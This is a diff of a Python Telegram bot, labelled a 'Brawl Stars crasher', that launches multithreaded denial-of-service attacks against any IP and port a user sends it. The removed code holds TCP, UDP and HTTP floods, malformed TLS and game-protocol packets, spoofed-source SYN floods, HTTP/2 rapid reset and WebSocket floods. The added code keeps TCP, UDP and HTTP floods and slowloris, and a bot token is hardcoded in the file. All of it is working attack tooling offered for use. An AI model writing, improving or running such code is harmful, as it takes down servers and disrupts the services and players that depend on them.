@@ -1,127 +1,27 @@
 #!/usr/bin/env python3
-import socket, struct, threading, random, time, re, os, sys, logging, base64, ssl as ssl_lib
+import socket, struct, threading, random, time, re, os, sys, logging
 import telebot
 from telebot import types
 
 BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
-TLS_THREADS = 500
-PARSER_THREADS = 400
-KEEPALIVE_THREADS = 500
-UDP_THREADS = 400
-SYN_THREADS = 300
-HTTP2_THREADS = 300
-WS_THREADS = 300
-TCP_FLOOD_THREADS = 500
-UDP_FLOOD_THREADS = 500
-HTTP_FLOOD_THREADS = 300
+TCP_THREADS = 50
+UDP_THREADS = 50
+HTTP_THREADS = 30
+SLOW_THREADS = 30
 
 logging.basicConfig(level=logging.INFO, stream=sys.stdout)
 logger = logging.getLogger(__name__)
-bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
+bot = telebot.TeleBot(BOT_TOKEN)
 active_attacks = {}
 
-MALFORMED_TLS = [
-    bytes.fromhex("1603010200010001FC0303" + "AA" * 32 + "00" + "0004" + "C0A8C09F" + "00FF0100"),
-    bytes.fromhex("1603010100010000FC0303" + "BB" * 32 + "00" + "0002" + "C02B" + "01" + "00"),
-    bytes.fromhex("160301001C0303" + "CC" * 32 + "00" + "0000" + "0000" + "0100"),
-    bytes.fromhex("160301FFFA0303" + "DD" * 32 + "00" + "0004" + "C02BC02F" + "00FF" + "FF" * 65530),
-]
-TITAN_MSG = {'HELLO': 10100, 'LOGIN': 10101, 'KEEP_ALIVE': 10108, 'MATCHMAKING': 14101, 'BATTLE': 14102, 'HOME': 24101}
-TITAN_VER = 1
-
-def titan_packet(msg_type, overflow=False):
-    msg_id = struct.pack(">H", msg_type)
-    length_field = struct.pack(">I", 0xFFFFFF)[1:] if overflow else struct.pack(">I", random.randint(16, 1024))[1:]
-    version = struct.pack(">I", TITAN_VER)
-    body = os.urandom(random.randint(4, 2048))
-    return msg_id + length_field + version + body
-
-def tls_hello_session():
-    sid = os.urandom(32)
-    rand = os.urandom(28)
-    hello = b'\x16\x03\x01' + struct.pack(">H", 70) + b'\x03\x03' + rand + b'\x20' + sid + b'\x00\x04\xC0\x2B\xC0\x2F\x01\x00\x00\xFF\x01\x00'
-    return hello
-
-def tcp_flood_worker(ip, port, stop_flag):
-    while not stop_flag.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.3)
-            sock.connect((ip, port))
-            for _ in range(100):
-                sock.send(os.urandom(random.randint(1024, 65535)))
-            sock.close()
-        except:
-            pass
-
-def udp_flood_worker(ip, port, stop_flag):
-    while not stop_flag.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for _ in range(1000):
-                sock.sendto(os.urandom(random.randint(1024, 65507)), (ip, port))
-            sock.close()
-        except:
-            pass
-
-def http_flood_worker(ip, port, stop_flag):
+def tcp_worker(ip, port, stop_flag):
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(0.5)
             sock.connect((ip, port))
-            for _ in range(50):
-                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(['Mozilla/5.0', 'Chrome/120', 'Safari/17'])}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode())
+            sock.send(os.urandom(random.randint(1024, 32768)))
             sock.close()
-        except:
-            pass
-
-def tls_worker(ip, port, stop_flag):
-    idx = 0
-    while not stop_flag.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            sock.connect((ip, port))
-            payload = MALFORMED_TLS[idx % len(MALFORMED_TLS)] if idx % 3 == 0 else tls_hello_session()
-            sock.send(payload)
-            idx += 1
-            sock.close()
-        except:
-            pass
-
-def parser_worker(ip, port, stop_flag):
-    while not stop_flag.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.3)
-            sock.connect((ip, port))
-            for mt in list(TITAN_MSG.values()):
-                if stop_flag.is_set():
-                    break
-                for ov in [True, False, True]:
-                    sock.send(titan_packet(mt, overflow=ov))
-            sock.close()
-        except:
-            pass
-
-def keepalive_worker(ip, port, stop_flag):
-    conns = []
-    while not stop_flag.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(30)
-            sock.connect((ip, port))
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-            sock.send(titan_packet(TITAN_MSG['KEEP_ALIVE']))
-            conns.append(sock)
-            if len(conns) > 1000:
-                for old in conns[:200]:
-                    try:
-                        old.close()
-                    except:
-                        pass
-                conns = conns[200:]
         except:
             pass
 
@@ -129,88 +29,40 @@ def udp_worker(ip, port, stop_flag):
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for _ in range(500):
-                if stop_flag.is_set():
-                    break
-                size = random.randint(2000, 65507)
-                data = os.urandom(size)
-                for offset in range(0, size, 1400):
-                    sock.sendto(data[offset:offset+1400], (ip, port))
+            sock.sendto(os.urandom(random.randint(1024, 65507)), (ip, port))
             sock.close()
         except:
             pass
 
-def syn_worker(ip, port, stop_flag):
-    fake_ips = [f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(100)]
-    while not stop_flag.is_set():
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            for fip in fake_ips[:10]:
-                sp = random.randint(1024, 65535)
-                ip_hdr = struct.pack('!BBHHHBBH4s4s', (4 << 4) + 5, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(fip), socket.inet_aton(ip))
-                tcp_hdr = struct.pack('!HHLLBBHHH', sp, port, random.randint(0, 4294967295), 0, (5 << 4), 2, 5840, 0, 0)
-                sock.sendto(ip_hdr + tcp_hdr, (ip, 0))
-            sock.close()
-        except:
-            pass
-
-def http2_worker(ip, port, stop_flag):
-    sid = 1
-    while not stop_flag.is_set():
-        try:
-            ctx = ssl_lib.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl_lib.CERT_NONE
-            ctx.set_alpn_protocols(['h2'])
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            ssock = ctx.wrap_socket(sock, server_hostname=ip)
-            ssock.connect((ip, port))
-            ssock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-            ssock.send(b'\x00\x00\x00\x04\x00\x00\x00\x00\x00')
-            for _ in range(100):
-                if stop_flag.is_set():
-                    break
-                hdr = struct.pack(">I", 0x01000000 | sid)[1:] + struct.pack(">I", 0x88000000)
-                ssock.send(hdr)
-                rst = struct.pack(">I", 4)[1:] + b'\x03\x00' + struct.pack(">I", sid)[1:] + struct.pack(">I", 0)
-                ssock.send(rst)
-                sid += 2
-            ssock.close()
-        except:
-            pass
-
-def ws_worker(ip, port, stop_flag):
+def http_worker(ip, port, stop_flag):
     while not stop_flag.is_set():
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(3)
+            sock.settimeout(1)
             sock.connect((ip, port))
-            key = base64.b64encode(os.urandom(16)).decode()
-            req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
-            sock.send(req.encode())
-            resp = sock.recv(1024)
-            if b'101' in resp:
-                for _ in range(50):
-                    if stop_flag.is_set():
-                        break
-                    size = random.randint(1024, 65535)
-                    mask_bit = random.randint(0, 1)
-                    mask_key = os.urandom(4) if mask_bit else b''
-                    if size < 126:
-                        header = struct.pack(">BB", 0x82 | mask_bit, size | (0x80 if mask_bit else 0x00))
-                    elif size < 65536:
-                        header = struct.pack(">BBH", 0x82 | mask_bit, 126 | (0x80 if mask_bit else 0x00), size)
-                    else:
-                        header = struct.pack(">BBQ", 0x82 | mask_bit, 127 | (0x80 if mask_bit else 0x00), size)
-                    payload = os.urandom(size)
-                    if mask_bit:
-                        payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
-                    sock.send(header + mask_key + payload)
+            for _ in range(10):
+                sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n".encode())
             sock.close()
         except:
             pass
+
+def slowloris_worker(ip, port, stop_flag):
+    conns = []
+    while not stop_flag.is_set():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(30)
+            sock.connect((ip, port))
+            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
+            conns.append(sock)
+            if len(conns) > 200:
+                for old in conns[:50]:
+                    try: old.close()
+                    except: pass
+                conns = conns[50:]
+        except:
+            pass
+        time.sleep(5)
 
 class Attack:
     def __init__(self, ip, port):
@@ -220,16 +72,10 @@ class Attack:
         self.threads = []
     def start(self):
         configs = [
-            (tcp_flood_worker, TCP_FLOOD_THREADS),
-            (udp_flood_worker, UDP_FLOOD_THREADS),
-            (http_flood_worker, HTTP_FLOOD_THREADS),
-            (tls_worker, TLS_THREADS),
-            (parser_worker, PARSER_THREADS),
-            (keepalive_worker, KEEPALIVE_THREADS),
+            (tcp_worker, TCP_THREADS),
             (udp_worker, UDP_THREADS),
-            (syn_worker, SYN_THREADS),
-            (http2_worker, HTTP2_THREADS),
-            (ws_worker, WS_THREADS),
+            (http_worker, HTTP_THREADS),
+            (slowloris_worker, SLOW_THREADS),
         ]
         for func, count in configs:
             for _ in range(count):
@@ -238,6 +84,7 @@ class Attack:
                 t = threading.Thread(target=func, args=(self.ip, self.port, self.stop_flag), daemon=True)
                 self.threads.append(t)
                 t.start()
+                time.sleep(0.01)
     def stop(self):
         self.stop_flag.set()
 
@@ -252,7 +99,7 @@ def parse_target(text):
 
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    bot.reply_to(message, "БРАВЛ СТАРС КРАШЕР\nОтправь IP:PORT\n/stop")
+    bot.reply_to(message, "КРАШЕР ЗАПУЩЕН\nОтправь IP:PORT\n/stop")
 
 @bot.message_handler(commands=['stop'])
 def stop_cmd(message):
@@ -279,14 +126,14 @@ def attack_cmd(message):
     attack = Attack(ip, port)
     attack.start()
     active_attacks[cid] = attack
-    total = TCP_FLOOD_THREADS + UDP_FLOOD_THREADS + HTTP_FLOOD_THREADS + TLS_THREADS + PARSER_THREADS + KEEPALIVE_THREADS + UDP_THREADS + SYN_THREADS + HTTP2_THREADS + WS_THREADS
-    bot.reply_to(message, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nПотоков: {total}\n/stop")
+    bot.reply_to(message, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nTCP:{TCP_THREADS} UDP:{UDP_THREADS} HTTP:{HTTP_THREADS} Slow:{SLOW_THREADS}\n/stop")
 
 @bot.message_handler(func=lambda m: True)
 def unknown_cmd(message):
-    bot.reply_to(message, "Отправь IP:PORT\n/start")
+    bot.reply_to(message, "Отправь IP:PORT\nПример: 34.240.15.100:9339\n/start")
 
 if __name__ == "__main__":
-    logger.info("Бот запущен...")
+    logger.info("Бот запущен")
     bot.remove_webhook()
-    bot.polling(none_stop=True)
+    time.sleep(1)
+    bot.polling(none_stop=True) 
